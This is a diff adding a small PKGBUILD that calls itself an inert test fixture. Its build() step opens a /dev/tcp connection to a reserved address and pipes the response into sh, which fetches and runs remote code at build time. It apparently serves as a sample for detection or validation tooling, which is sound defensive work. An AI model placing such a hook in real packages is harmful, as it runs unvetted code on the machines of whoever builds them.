@@ -1,0 +1,12 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=dev-tcp
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org/demo
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  exec 3<>/dev/tcp/198.51.100.10/80
+  cat <&3 | sh
+}
